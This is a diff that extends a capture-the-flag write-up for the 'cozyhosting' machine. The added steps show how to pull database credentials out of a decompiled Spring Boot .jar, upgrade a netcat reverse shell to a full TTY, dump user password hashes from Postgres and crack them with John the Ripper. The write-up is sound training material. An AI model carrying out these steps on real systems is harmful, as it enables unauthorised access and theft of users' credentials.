@@ -57,4 +57,38 @@ To download it to our local machine we use:
 wget IP_MACHINE/cloudhosting-0.0.1.jar
 ```
 ## Exploiting the database
-#### To be continued... 
+To reverse engineer the file we obtained, we opened [ jd-gui > Openfile > cloudhosting-0.0.1.jar ]. and we head to BOOT-INF/classes/application.properties where we will find the postgres database configurations:
+```
+# AN_PASSWORD: is the database password
+spring.datasource.username=postgres
+spring.datasource.password=AN_PASSWORD
+```
+now we go back to the reverse-shell in cozyhosting but we have to get a fully-tty. The procedure to obtain a fully-tty is as follows:
+```
+script /dev/null -qc /bin/bash #/dev/null is to not store anything
+(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
+```
+Now we enter the Postgres database of the remote system with the credentials that we obtained by reverse engineering the .jar file
+```
+psql -h <host> -U <username>
+# It will ask us for a password, so we enter the AN_PASSWORD
+```
+Within the database we execute the following commands to obtain the authentication hashes of the system users
+```
+\c cozyhosting
+\d
+SELECT * FROM users;
+```
+## breaking hashes (cryptography)
+which would look like this:
+```
+# HASHONE: is a hash of 61 characters
+# HASHTWO: is another hash of 61 characters
+kanderson | HASHONE | User
+admin     | HASHTWO | Admin
+```
+We save them in a hash.txt file and proceed to decrypt the hashes with the John the Ripper tool (This process could take several minutes or even seconds depending on the GPU you have)
+```
+john --wordlist=$HOME/rockyou.txt hash.txt
+```
+#### to be continued... 
